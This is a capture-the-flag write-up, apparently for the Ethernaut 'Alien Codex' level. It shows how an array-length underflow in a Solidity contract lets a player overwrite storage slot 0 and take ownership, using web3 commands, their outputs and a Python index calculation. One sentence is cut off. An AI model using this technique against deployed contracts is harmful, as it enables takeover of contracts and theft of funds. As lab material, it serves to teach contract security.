## Storage layout

The goal is to overwrite the storage slot 0, which contains the contract owner:

```js
await contract.owner()
// '0x0BC04aa6aaC163A6B3667636D798FA053D43BD11'
await web3.eth.getStorageAt(contract.address, 0, (e,d)=>{console.log(d)});
// '0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'
```

Actually the first slot is packed together with the `contact` boolean:

```js
await contract.contact()
// true
await web3.eth.getStorageAt(contract.address, 0, (e,d)=>{console.log(d)});
// '0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11'
```

Then slot 1 is the length of the byte array `codex`:

```js
await web3.eth.getStorageAt(contract.address, 1, (e,d)=>{console.log(d)});
// '0x0000000000000000000000000000000000000000000000000000000000000000'
await contract.record('0x1111111111111111111111111111111111111111111111111111111111111111')
await web3.eth.getStorageAt(contract.address, 1, (e,d)=>{console.log(d)});
// '0x0000000000000000000000000000000000000000000000000000000000000001'
```

And then, the elements of the array are stored contiguously but starting from a.
The formula to compute the index of a particular element is given [in the docs][docs-storage-layout]:

## Matching the array indexes to the storage slots

First, the array allows to access as many items as its length.
Luckily, there's an underflow vulnerability:

```solidity
function retract() contacted public {
    codex.length--;
}
```

```js
await contract.retract()
await web3.eth.getStorageAt(contract.address, 1, (e,d)=>{console.log(d)});
// '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
```

The array now spans the whole length of the storage, $2^{256}$.
It starts at the position `keccak(1)`:

```js
// web3.utils.keccak256(web3.eth.abi.encodeParameters(['uint256'],[1]))
web3.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001')
// '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'
```

Slot            | Element
--------------- | --------------------
0               | `contact` + `owner`
1               | array length
2               | empty
...             | ...
`keccak(1)`     | `codex[0]`
`keccak(1)+1`   | `codex[1]`
...             | ...
$2^{256} - 1$   | $codex\[2^{256} - 1 - keccak\(1\)\]$
0 = $2^{256}$   | $codex\[2^{256} - keccak\(1\)\]$

This scheme can be verified by hand: modifying `codex[0]` should alter the storage slot `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`.

```js
await web3.eth.getStorageAt(contract.address, '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6', (e,d)=>{console.log(d)});
// '0x0000000000000000000000000000000000000000000000000000000000000000'
await contract.revise(0, '0x000000000000000000000000' + player.slice(2))
await web3.eth.getStorageAt(contract.address, '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6', (e,d)=>{console.log(d)});
// '0x000000000000000000000000aad026992b0065d4a9c7019b082cb748d042411f'
```

## Overwriting the storage slot 0

The array index corresponding to the slot 0 can be computed in Python:

```python
hex(1 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
# '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'
```

```js
index = '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a';
await contract.revise(index, '0x000000000000000000000000' + player.slice(2));
await web3.eth.getStorageAt(contract.address, 0, (e,d)=>{console.log(d)});
// '0x000000000000000000000000AAD026992b0065D4A9c7019B082cb748D042411F' 
```

[docs-storage-layout]: https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html#mappings-and-dynamic-arrays
